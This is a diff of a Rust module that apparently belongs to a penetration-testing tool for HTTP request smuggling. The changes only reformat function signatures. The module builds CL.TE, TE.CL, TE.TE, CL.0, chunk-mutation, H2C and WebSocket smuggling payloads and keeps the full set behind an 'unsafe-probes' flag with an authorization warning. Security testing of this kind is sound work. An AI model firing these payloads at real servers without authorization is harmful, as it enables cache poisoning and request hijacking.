@@ -117,12 +117,19 @@ pub fn te_obfuscations() -> Vec<String> {
 }
 
 /// Backward-compatible CL.TE (hardcodes CL=0).
-pub fn cl_te(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn cl_te(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     cl_te_custom(host, smuggled_prefix, 0)
 }
 
 /// CL.TE with a custom Content-Length.
-pub fn cl_te_custom(host: &str, smuggled_prefix: &str, content_length: usize) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn cl_te_custom(
+    host: &str,
+    smuggled_prefix: &str,
+    content_length: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -144,7 +151,10 @@ pub fn cl_te_custom(host: &str, smuggled_prefix: &str, content_length: usize) ->
 }
 
 /// Backward-compatible TE.CL (dynamically computes CL).
-pub fn te_cl(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn te_cl(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let smuggled = ensure_crlf(&prefix);
@@ -173,7 +183,11 @@ pub fn te_cl(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crat
 }
 
 /// TE.TE with full obfuscation matrix.
-pub fn te_te(host: &str, smuggled_prefix: &str, obfuscation_index: usize) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn te_te(
+    host: &str,
+    smuggled_prefix: &str,
+    obfuscation_index: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let obs = te_obfuscations();
     let te_header = &obs[obfuscation_index % obs.len()];
     let host = validate_host(host)?;
@@ -197,7 +211,10 @@ pub fn te_te(host: &str, smuggled_prefix: &str, obfuscation_index: usize) -> Res
 }
 
 /// CL.0 payload.
-pub fn cl_zero(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn cl_zero(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -217,7 +234,12 @@ pub fn cl_zero(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, cr
 }
 
 /// Dual-Content-Length payload.
-pub fn dual_cl(host: &str, smuggled_prefix: &str, cl1: usize, cl2: usize) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn dual_cl(
+    host: &str,
+    smuggled_prefix: &str,
+    cl1: usize,
+    cl2: usize,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -238,7 +260,10 @@ pub fn dual_cl(host: &str, smuggled_prefix: &str, cl1: usize, cl2: usize) -> Res
 }
 
 /// Multi-value Content-Length.
-pub fn multi_value_cl(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn multi_value_cl(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -258,7 +283,10 @@ pub fn multi_value_cl(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayl
 }
 
 /// Content-Length formatting mutations.
-pub fn cl_obfuscation(host: &str, smuggled_prefix: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn cl_obfuscation(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -284,7 +312,10 @@ pub fn cl_obfuscation(host: &str, smuggled_prefix: &str) -> Result<Vec<Smuggling
 }
 
 /// Chunk-extension payload.
-pub fn chunk_extension(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn chunk_extension(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -305,7 +336,10 @@ pub fn chunk_extension(host: &str, smuggled_prefix: &str) -> Result<SmugglingPay
 }
 
 /// Chunk-size formatting mutations.
-pub fn chunk_size_mutations(host: &str, smuggled_prefix: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn chunk_size_mutations(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -332,7 +366,11 @@ pub fn chunk_size_mutations(host: &str, smuggled_prefix: &str) -> Result<Vec<Smu
 }
 
 /// GET/PUT/DELETE/... body smuggling.
-pub fn method_body_smuggle(method: &str, host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn method_body_smuggle(
+    method: &str,
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -353,7 +391,10 @@ pub fn method_body_smuggle(method: &str, host: &str, smuggled_prefix: &str) -> R
 }
 
 /// HTTP/1.0 persistence disagreement.
-pub fn http10_persistence(host: &str, smuggled_prefix: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn http10_persistence(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let prefix = ensure_double_crlf(&prefix);
@@ -388,7 +429,10 @@ pub fn http10_persistence(host: &str, smuggled_prefix: &str) -> Result<Vec<Smugg
 }
 
 /// HTTP/0.9 simple-request smuggling.
-pub fn http09_downgrade(host: &str, smuggled_prefix: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn http09_downgrade(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let _host = validate_host(host)?;
     let prefix = validate_prefix(smuggled_prefix)?;
     let raw = format!("GET /\r\n{}", ensure_double_crlf(&prefix));
@@ -457,7 +501,9 @@ pub fn detect_te_cl(host: &str) -> Result<SmugglingPayload, crate::safety::Safet
 }
 
 /// Precedence test: both CL and TE present with matching body.
-pub fn cl_te_precedence_test(host: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn cl_te_precedence_test(
+    host: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let body = "5\r\nhello\r\n0\r\n\r\n";
     let cl = body.len();
@@ -478,7 +524,10 @@ pub fn cl_te_precedence_test(host: &str) -> Result<Vec<SmugglingPayload>, crate:
 }
 
 /// H2C upgrade smuggling.
-pub fn h2c_smuggle(host: &str, http2_settings: Option<&str>) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn h2c_smuggle(
+    host: &str,
+    http2_settings: Option<&str>,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
     let raw = format!(
@@ -498,7 +547,9 @@ pub fn h2c_smuggle(host: &str, http2_settings: Option<&str>) -> Result<Smuggling
 }
 
 /// H2C `--upgrade-only` variant.
-pub fn h2c_upgrade_only_smuggle(host: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn h2c_upgrade_only_smuggle(
+    host: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let raw = format!(
         "GET / HTTP/1.1\r\n\
@@ -516,7 +567,9 @@ pub fn h2c_upgrade_only_smuggle(host: &str) -> Result<SmugglingPayload, crate::s
 }
 
 /// Malformed HTTP2-Settings variants.
-pub fn malformed_http2_settings(host: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn malformed_http2_settings(
+    host: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let settings = vec!["!!!", "", "AA"];
     Ok(settings
@@ -541,7 +594,11 @@ pub fn malformed_http2_settings(host: &str) -> Result<Vec<SmugglingPayload>, cra
 }
 
 /// H2C POST-body smuggling.
-pub fn h2c_post_smuggle(host: &str, body: &[u8], http2_settings: Option<&str>) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn h2c_post_smuggle(
+    host: &str,
+    body: &[u8],
+    http2_settings: Option<&str>,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     let host = sanitize_input(host)?;
     let settings = http2_settings.unwrap_or(DEFAULT_HTTP2_SETTINGS);
     let content_length = body.len();
@@ -565,7 +622,10 @@ pub fn h2c_post_smuggle(host: &str, body: &[u8], http2_settings: Option<&str>) -
 }
 
 /// WebSocket smuggling with a random nonce.
-pub fn websocket_smuggle(host: &str, path: &str) -> Result<SmugglingPayload, crate::safety::SafetyError> {
+pub fn websocket_smuggle(
+    host: &str,
+    path: &str,
+) -> Result<SmugglingPayload, crate::safety::SafetyError> {
     websocket_smuggle_custom(host, path, None, None)
 }
 
@@ -613,7 +673,9 @@ pub fn websocket_smuggle_custom(
 }
 
 /// All detection probes (safe, never poison sockets).
-pub fn all_detection_probes(host: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn all_detection_probes(
+    host: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     Ok(vec![detect_cl_te(host)?, detect_te_cl(host)?])
 }
 
@@ -625,7 +687,10 @@ pub fn all_detection_probes(host: &str) -> Result<Vec<SmugglingPayload>, crate::
 /// request splitting. Only enable on targets you own or have explicit
 /// written authorization to test.
 #[cfg(feature = "unsafe-probes")]
-pub fn all_payloads(host: &str, smuggled_prefix: &str) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
+pub fn all_payloads(
+    host: &str,
+    smuggled_prefix: &str,
+) -> Result<Vec<SmugglingPayload>, crate::safety::SafetyError> {
     let mut out = vec![
         cl_te(host, smuggled_prefix)?,
         te_cl(host, smuggled_prefix)?,
